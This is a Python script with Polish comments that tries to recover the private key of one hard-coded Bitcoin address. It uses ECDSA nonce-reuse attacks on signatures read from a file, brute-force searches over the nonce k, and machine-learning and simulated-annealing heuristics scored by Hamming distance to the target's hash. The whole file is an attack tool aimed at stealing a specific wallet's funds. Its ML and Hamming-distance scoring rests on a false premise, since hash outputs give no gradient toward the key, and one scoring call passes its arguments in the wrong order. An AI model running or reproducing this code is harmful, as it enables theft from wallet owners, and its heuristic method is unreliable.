import sys
import warnings
warnings.filterwarnings("ignore", message="Could not find the number of physical cores")
import os
os.environ["LOKY_MAX_CPU_COUNT"] = "1"

import base58
import ecdsa
from sympy import mod_inverse
from functools import lru_cache
import numpy as np
from sklearn.linear_model import SGDRegressor
from sklearn.preprocessing import StandardScaler
from sklearn.decomposition import PCA
from sklearn.cluster import KMeans
import random
import time
import math
import logging
import hashlib
import traceback
from concurrent.futures import ThreadPoolExecutor

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# ------------------------------
# Funkcje do obsługi adresów bech32
CHARSET = "qpzry9x8gf2tvdw0s3jn54khce6mua7l"

def bech32_polymod(values):
    generators = [0x3b6a57b2, 0x26508e6d, 0x1ea119fa, 0x3d4233dd, 0x2a1462b3]
    chk = 1
    for v in values:
        top = chk >> 25
        chk = ((chk & 0x1ffffff) << 5) ^ v
        for i in range(5):
            if (top >> i) & 1:
                chk ^= generators[i]
    return chk

def bech32_hrp_expand(hrp):
    return [ord(x) >> 5 for x in hrp] + [0] + [ord(x) & 31 for x in hrp]

def verify_checksum(hrp, data):
    return bech32_polymod(bech32_hrp_expand(hrp) + data) == 1

def bech32_decode(bech):
    if any(ord(x) < 33 or ord(x) > 126 for x in bech) or (bech.lower() != bech and bech.upper() != bech):
        return (None, None)
    bech = bech.lower()
    pos = bech.rfind('1')
    if pos < 1 or pos + 7 > len(bech) or len(bech) > 90:
        return (None, None)
    hrp = bech[:pos]
    data = []
    for x in bech[pos+1:]:
        if x not in CHARSET:
            return (None, None)
        data.append(CHARSET.find(x))
    if not verify_checksum(hrp, data):
        return (None, None)
    return (hrp, data[:-6])

def convertbits(data, frombits, tobits, pad=True):
    acc = 0; bits = 0; ret = []; maxv = (1 << tobits) - 1
    for value in data:
        if value < 0 or value >> frombits:
            return None
        acc = (acc << frombits) | value; bits += frombits
        while bits >= tobits:
            bits -= tobits; ret.append((acc >> bits) & maxv)
    if pad:
        if bits:
            ret.append((acc << (tobits - bits)) & maxv)
    elif bits >= frombits or ((acc << (tobits - bits)) & maxv):
        return None
    return ret

def bech32_create_checksum(hrp, data):
    values = bech32_hrp_expand(hrp) + data
    polymod = bech32_polymod(values + [0,0,0,0,0,0]) ^ 1
    return [(polymod >> 5 * (5 - i)) & 31 for i in range(6)]

def bech32_encode(hrp, data):
    combined = data + bech32_create_checksum(hrp, data)
    return hrp + "1" + "".join([CHARSET[d] for d in combined])

# ------------------------------
# Parametry globalne
n = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141
target_address = "bc1qm34lsc65zpw79lxes69zkqmk6ee3ewf0j77s3h"

def get_hash160_from_address(addr):
    if addr.startswith("1") or addr.startswith("3"):
        try:
            decoded = base58.b58decode_check(addr)
            return decoded[1:21].hex()
        except Exception as e:
            logging.error("Błąd dekodowania adresu base58: %s", e)
            return None
    elif addr.startswith("bc1"):
        hrp, data = bech32_decode(addr)
        if hrp is None or data is None:
            logging.error("Błąd dekodowania adresu bech32")
            return None
        decoded = convertbits(data[1:], 5, 8, False)
        if decoded is None:
            logging.error("Błąd konwersji bitów dla adresu bech32")
            return None
        if len(decoded) not in (20, 32):
            logging.error("Nieprawidłowa długość witness program: %d", len(decoded))
            return None
        return bytes(decoded).hex()
    else:
        logging.error("Nieobsługiwany format adresu: %s", addr)
        return None

target_hash160 = get_hash160_from_address(target_address)
if target_hash160 is None:
    raise ValueError("Błąd przy dekodowaniu target_address")

memory_size = 1000
ml_update_interval = 10
cpu_usage_target = 50.0
current_search_range = 100
used_k_set = set()
HAMMING_THRESHOLD = 20

MODEL_FILE = "ml_model.pkl"
SCALER_FILE = "scaler.pkl"
MODEL_K_FILE = "ml_k_model.pkl"
SCALER_K_FILE = "scaler_k.pkl"
MODEL_D_FILE = "ml_d_model.pkl"
SCALER_D_FILE = "scaler_d.pkl"

# --- Funkcje pomocnicze do porównania hashy ---
def hamming_distance(hash1, hash2):
    bin1 = bin(int(hash1, 16))[2:].zfill(160)
    bin2 = bin(int(hash2, 16))[2:].zfill(160)
    return sum(c1 != c2 for c1, c2 in zip(bin1, bin2))

def common_prefix_length(hash1, hash2):
    bin1 = bin(int(hash1, 16))[2:].zfill(160)
    bin2 = bin(int(hash2, 16))[2:].zfill(160)
    count = 0
    for b1, b2 in zip(bin1, bin2):
        if b1 == b2:
            count += 1
        else:
            break
    return count

# --- Konwersja adresów i kluczy ---
@lru_cache(maxsize=1024)
def private_key_to_address(d):
    try:
        sk = ecdsa.SigningKey.from_secret_exponent(d, curve=ecdsa.SECP256k1)
        vk = sk.verifying_key
        pubkey = vk.to_string("compressed")
        sha = hashlib.sha256(pubkey).digest()
        rip = hashlib.new('ripemd160', sha).digest()  # 20 bajtów – witness program
        five_bit = convertbits(list(rip), 8, 5)
        if five_bit is None:
            raise ValueError("Błąd konwersji witness program do 5-bit")
        return bech32_encode("bc", [0] + five_bit)
    except Exception as e:
        logging.error("Błąd w private_key_to_address: %s", e)
        return None

# --- Funkcja odczytująca transakcje z pliku vulnerabilities.txt ---
def get_real_transactions():
    transactions = []
    try:
        with open("vulnerabilities.txt", "r") as f:
            block = {}
            for line in f:
                line = line.strip()
                if not line:
                    continue
                if line.startswith("txid1:"):
                    block["txid1"] = line.split(":", 1)[1].strip()
                elif line.startswith("r1:"):
                    block["r1"] = line.split(":", 1)[1].strip()
                elif line.startswith("s1:"):
                    block["s1"] = line.split(":", 1)[1].strip()
                elif line.startswith("z1:"):
                    block["z1"] = line.split(":", 1)[1].strip()
                elif line.startswith("txid2:"):
                    block["txid2"] = line.split(":", 1)[1].strip()
                elif line.startswith("r2:"):
                    block["r2"] = line.split(":", 1)[1].strip()
                elif line.startswith("s2:"):
                    block["s2"] = line.split(":", 1)[1].strip()
                elif line.startswith("z2:"):
                    block["z2"] = line.split(":", 1)[1].strip()
                elif line.startswith("Ratio:"):
                    if "r1" in block and "s1" in block and "z1" in block:
                        try:
                            transactions.append({
                                "r": int(block["r1"], 16),
                                "s": int(block["s1"], 16),
                                "z": int(block["z1"], 16)
                            })
                        except Exception as e:
                            logging.error("Błąd konwersji tx1: %s", e)
                    if "r2" in block and "s2" in block and "z2" in block:
                        try:
                            transactions.append({
                                "r": int(block["r2"], 16),
                                "s": int(block["s2"], 16),
                                "z": int(block["z2"], 16)
                            })
                        except Exception as e:
                            logging.error("Błąd konwersji tx2: %s", e)
                    block = {}
                elif line.startswith("----------------------------------"):
                    if block:
                        if "r1" in block and "s1" in block and "z1" in block:
                            try:
                                transactions.append({
                                    "r": int(block["r1"], 16),
                                    "s": int(block["s1"], 16),
                                    "z": int(block["z1"], 16)
                                })
                            except Exception as e:
                                logging.error("Błąd konwersji tx1: %s", e)
                        if "r2" in block and "s2" in block and "z2" in block:
                            try:
                                transactions.append({
                                    "r": int(block["r2"], 16),
                                    "s": int(block["s2"], 16),
                                    "z": int(block["z2"], 16)
                                })
                            except Exception as e:
                                logging.error("Błąd konwersji tx2: %s", e)
                        block = {}
        print("Wczytano {} podpisów.".format(len(transactions)))
        return transactions
    except Exception as e:
        logging.error("Błąd odczytu pliku vulnerabilities.txt: %s", e)
        return []

# --- Funkcja odzyskująca d (cache'owana) ---
@lru_cache(maxsize=1024)
def recover_d_cached(r, s, k, z):
    try:
        inv_r = mod_inverse(r, n)
        logging.debug(f"r: {r}, s: {s}, k: {k}, z: {z}, inv_r: {inv_r}")
    except Exception as e:
        logging.error("Błąd przy obliczaniu inwersji: %s", e)
        return None
    d = ((s * k - z) * inv_r) % n
    logging.debug(f"Obliczone d: {d}")
    if 1 < d < n:
        return d
    return None

def compute_candidate_score(r, s, z, candidate_k):
    d_candidate = recover_d_cached(r, s, z, candidate_k)
    if d_candidate is None:
        return 1000
    addr_candidate = private_key_to_address(d_candidate)
    if addr_candidate is None:
        return 1000
    hash_candidate = get_hash160_from_address(addr_candidate)
    if hash_candidate is None:
        return 1000
    hd = hamming_distance(hash_candidate, target_hash160)
    prefix = common_prefix_length(hash_candidate, target_hash160)
    score = hd - 5 * prefix
    return score

def refine_k(r, s, z, initial_k):
    best_k = initial_k
    best_score = compute_candidate_score(r, s, z, best_k)
    temperature = 100.0
    cooling_rate = 0.5
    for _ in range(300):
        candidate_k = best_k + random.randint(-10, 10)
        if candidate_k < 1:
            candidate_k = 1
        score = compute_candidate_score(r, s, z, candidate_k)
        if score < best_score or random.random() < math.exp((best_score - score) / temperature):
            best_k = candidate_k
            best_score = score
        temperature *= cooling_rate
    if best_score > 50:
        for _ in range(200):
            candidate_k = best_k + random.randint(-20, 20)
            if candidate_k < 1:
                candidate_k = 1
            score = compute_candidate_score(r, s, z, candidate_k)
            if score < best_score:
                best_k = candidate_k
                best_score = score
    return best_k

def recover_keys_from_two(tx1, tx2):
    if tx1["r"] != tx2["r"]:
        raise ValueError("Transakcje mają różne r, nie można zastosować reuse k attack!")
    diff_s = (tx1["s"] - tx2["s"]) % n
    inv_diff_s = mod_inverse(diff_s, n)
    k = ((tx1["z"] - tx2["z"]) % n) * inv_diff_s % n
    inv_r = mod_inverse(tx1["r"], n)
    d = ((tx1["s"] * k - tx1["z"]) % n) * inv_r % n
    return k, d

# --- Atak ratio-based korzystający z kolejnych par podpisów z listy ---
# Używamy globalnej listy par (indeksy) i wskaźnika, który jest tasowany na początku
def init_ratio_pairs(signatures):
    # Tworzymy listę par (indeksy par: 0, 2, 4, ...)
    pairs = list(range(0, len(signatures) - 1, 2))
    random.shuffle(pairs)
    return pairs

# Globalna lista par i wskaźnik
global_ratio_pairs = None
global_ratio_index = 0

def attack_using_ratios(signatures):
    global global_ratio_pairs, global_ratio_index
    if global_ratio_pairs is None or global_ratio_index >= len(global_ratio_pairs):
        global_ratio_pairs = init_ratio_pairs(signatures)
        global_ratio_index = 0
    pair_index = global_ratio_pairs[global_ratio_index]
    global_ratio_index += 1
    tx1 = signatures[pair_index]
    tx2 = signatures[pair_index + 1]
    try:
        if tx1["r"] != tx2["r"]:
            return (None, None, None, None)
        k_candidate, d_candidate = recover_keys_from_two(tx1, tx2)
        addr_candidate = private_key_to_address(d_candidate)
        if addr_candidate is None:
            return (None, None, None, None)
        hash_candidate = get_hash160_from_address(addr_candidate)
        score = hamming_distance(hash_candidate, target_hash160)
        prefix = common_prefix_length(hash_candidate, target_hash160)
        return (d_candidate, score, prefix, [k_candidate])
    except Exception as e:
        logging.error("Błąd w attack_using_ratios: %s", e)
        return (None, None, None, None)

def extract_d_features(sig, candidate_k, ratio_score, common_prefix):
    r_norm = sig["r"] / n
    s_norm = sig["s"] / n
    z_norm = sig["z"] / n
    k_norm = candidate_k / n
    return [r_norm, s_norm, z_norm, k_norm, common_prefix]

# --- Zaktualizowana funkcja analizy korelacji podpisów ---
def analyze_all_signatures_correlations(signatures):
    r_vals = np.array([float(tx["r"]) for tx in signatures if isinstance(tx.get("r"), int)])
    s_vals = np.array([float(tx["s"]) for tx in signatures if isinstance(tx.get("s"), int)])
    z_vals = np.array([float(tx["z"]) for tx in signatures if isinstance(tx.get("z"), int)])
    if len(r_vals) < 2 or len(s_vals) < 2 or len(z_vals) < 2:
        return {}
    corr_r_s = np.corrcoef(np.vstack((r_vals, s_vals)))[0, 1]
    corr_r_z = np.corrcoef(np.vstack((r_vals, z_vals)))[0, 1]
    corr_s_z = np.corrcoef(np.vstack((s_vals, z_vals)))[0, 1]
    return {"r_s": corr_r_s, "r_z": corr_r_z, "s_z": corr_s_z}

# --- Zaktualizowana funkcja klastrowania r ---
def clustering_r(r_list, n_clusters):
    if len(r_list) < n_clusters:
        return None
    r_values = np.array(r_list).reshape(-1, 1)
    kmeans = KMeans(n_clusters=n_clusters, random_state=42).fit(r_values)
    logging.info("Klastrowanie r: inertia = %.2f", kmeans.inertia_)
    return kmeans.labels_

# --- Zaktualizowana funkcja sprawdzania korelacji ---
def check_correlation_ml(r_val, r_list, model, scaler):
    try:
        if isinstance(r_list, (int, float)):
            r_list = [r_list]
        r_ints = []
        for x in r_list:
            if isinstance(x, str):
                r_ints.append(int(x, 16))
            else:
                r_ints.append(int(x))
        r_ints = np.array(r_ints, dtype=float)
        if len(r_ints) < 2:
            return False
        indices = np.arange(len(r_ints), dtype=float)
        data = np.vstack((indices, r_ints))
        corr = np.corrcoef(data)[0, 1]
        return abs(corr) > 0.9
    except Exception as e:
        logging.error("Błąd w check_correlation_ml: %s", e)
        return False

def save_ml_state(model, scaler):
    logging.info("Stan ML został zapisany.")

# --- Inicjalizacja modeli ML dla k i d ---
from sklearn.linear_model import SGDRegressor
from sklearn.preprocessing import StandardScaler
scaler_k = StandardScaler()
scaler_d = StandardScaler()
X_dummy = np.array([[0.1, 0.1, 0.1, 0.1, 0]])
y_dummy = np.array([0.001])
scaler_k.fit(X_dummy)
scaler_d.fit(X_dummy)
ml_k_model = SGDRegressor(max_iter=1000, tol=1e-3, random_state=42)
ml_d_model = SGDRegressor(max_iter=1000, tol=1e-3, random_state=42)
ml_k_model.partial_fit(X_dummy, y_dummy)
ml_d_model.partial_fit(X_dummy, y_dummy)

# --- Główna pętla ---
def main():
    global current_search_range
    iter_count = 0
    print("==== Rozpoczynam analizę ataków na ECDSA ====")
    print("Docelowy adres:", target_address)
    
    real_signatures = get_real_transactions()
    if not real_signatures:
        print("Nie udało się odczytać transakcji z pliku vulnerabilities.txt")
        sys.exit(1)
    
    print("Wczytano {} podpisów.".format(len(real_signatures)))
    correlations = analyze_all_signatures_correlations(real_signatures)
    logging.info("Początkowe korelacje podpisów: %s", correlations)
    
    # Używamy danych z pliku – iterujemy cyklicznie po liście podpisów
    index = 0
    training_data = []
    training_labels = []
    while True:
        # Co ratio_interval iteracji wykonujemy atak ratio-based na kolejną parę
        if iter_count % 10 == 0:
            d_ratio, score_ratio, prefix_ratio, k_candidate_list = attack_using_ratios(real_signatures)
            if d_ratio is not None:
                addr_ratio = private_key_to_address(d_ratio)
                logging.info("Atak ratio-based: kandydat d = %d, Hamming distance = %d, wspólny prefiks = %d",
                             d_ratio, score_ratio, prefix_ratio)
                # Aktualizujemy model ml_d_model z nagrodą = -score_ratio/160
                reward_ratio = -score_ratio / 160.0
                # Używamy podpisu, z którego pochodzi para (dla uproszczenia, używamy podpisu o indeksie index)
                features_ratio = extract_d_features(real_signatures[index], k_candidate_list[0], score_ratio,
                                                    common_prefix_length(get_hash160_from_address(addr_ratio), target_hash160))
                ml_d_model.partial_fit(scaler_d.transform([features_ratio]), [reward_ratio])
                logging.info("Zaktualizowano model ml_d_model (reward = %.4f)", reward_ratio)
                if score_ratio == 0:
                    print("🎉 ODNALAZŁEM POPRAWNE d (atak ratio-based)! 🎉")
                    print("Adres:", addr_ratio)
                    sys.exit(0)
        
        # Pobieramy kolejny podpis z listy (cyklicznie)
        sig = real_signatures[index]
        index = (index + 1) % len(real_signatures)
        r_val = sig["r"]
        s_val = sig["s"]
        z_val = sig["z"]
        features_sig = [r_val / n, s_val / n, z_val / n, 0, 0]
        try:
            predicted_k_norm = ml_k_model.predict(scaler_k.transform([features_sig]))[0]
        except Exception as e:
            predicted_k_norm = 0.001
        predicted_k = int(max(1, min(round(predicted_k_norm * n), n - 1)))
        candidate_lower = max(1, predicted_k - current_search_range)
        candidate_upper = min(n - 1, predicted_k + current_search_range)
        
        best_candidate = None
        best_hd = 1000
        best_prefix = -1
        for candidate_k in range(candidate_lower, candidate_upper + 1):
            d_candidate = recover_d_cached(r_val, s_val, candidate_k, z_val)
            if d_candidate is None:
                continue
            addr_candidate = private_key_to_address(d_candidate)
            if addr_candidate is None:
                continue
            hash_candidate = get_hash160_from_address(addr_candidate)
            hd = hamming_distance(hash_candidate, target_hash160)
            prefix = common_prefix_length(hash_candidate, target_hash160)
            if hd < best_hd or (hd == best_hd and prefix > best_prefix):
                best_hd = hd
                best_prefix = prefix
                best_candidate = (candidate_k, d_candidate, addr_candidate, hash_candidate)
        
        # Jeśli dystans jest wysoki, próbujemy refinement
        if best_candidate is not None and best_hd > HAMMING_THRESHOLD:
            refined_k = refine_k(r_val, s_val, z_val, best_candidate[0])
            d_candidate = recover_d_cached(r_val, s_val, refined_k, z_val)
            if d_candidate is not None:
                addr_candidate = private_key_to_address(d_candidate)
                if addr_candidate is not None:
                    hash_candidate = get_hash160_from_address(addr_candidate)
                    hd = hamming_distance(hash_candidate, target_hash160)
                    prefix = common_prefix_length(hash_candidate, target_hash160)
                    if hd < best_hd or (hd == best_hd and prefix > best_prefix):
                        best_hd = hd
                        best_prefix = prefix
                        best_candidate = (refined_k, d_candidate, addr_candidate, hash_candidate)
        
        # Zbieramy dane treningowe dla ml_k_model – nagroda to -hd/160
        reward = -best_hd / 160.0 if best_candidate is not None else -1.0
        training_data.append(features_sig)
        training_labels.append(reward)
        if len(training_data) >= 50:
            ml_k_model.partial_fit(scaler_k.transform(training_data), training_labels)
            training_data = []
            training_labels = []
        
        if best_candidate is not None:
            chosen_k, d, addr, hash_candidate = best_candidate
            used_k_set.add(chosen_k)
            logging.info("Iteracja %d: Wybrano k = %d z Hamming distance = %d, wspólny prefiks = %d",
                         iter_count, chosen_k, best_hd, best_prefix)
            logging.info("Adres wygenerowany: %s", addr)
            logging.info("Hamming distance: %d", best_hd)
            logging.info("Wspólny prefiks: %d", best_prefix)
            if addr == target_address:
                save_ml_state(ml_k_model, scaler_k)
                print("🎉 ODNALAZŁEM POPRAWNE d! 🎉")
                print("Adres:", addr)
                sys.exit(0)
        
        # Aktualizacja zakresu wyszukiwania na podstawie korelacji podpisów
        ml_corr = check_correlation_ml(r_val, [tx["r"] for tx in real_signatures], None, None)
        if ml_corr:
            current_search_range = max(50, current_search_range - 50)
        else:
            current_search_range += 50
        
        if iter_count % ml_update_interval == 0:
            with ThreadPoolExecutor(max_workers=4) as executor:
                executor.submit(lambda: None)
            correlations = analyze_all_signatures_correlations(real_signatures)
            logging.info("Iteracja %d - analiza korelacji: %s", iter_count, correlations)
        
        print("Nie znaleziono klucza d, ponawiam próbę... Iteracja:", iter_count)
        iter_count += 1
        time.sleep(0.1)

if __name__ == "__main__":
    main()
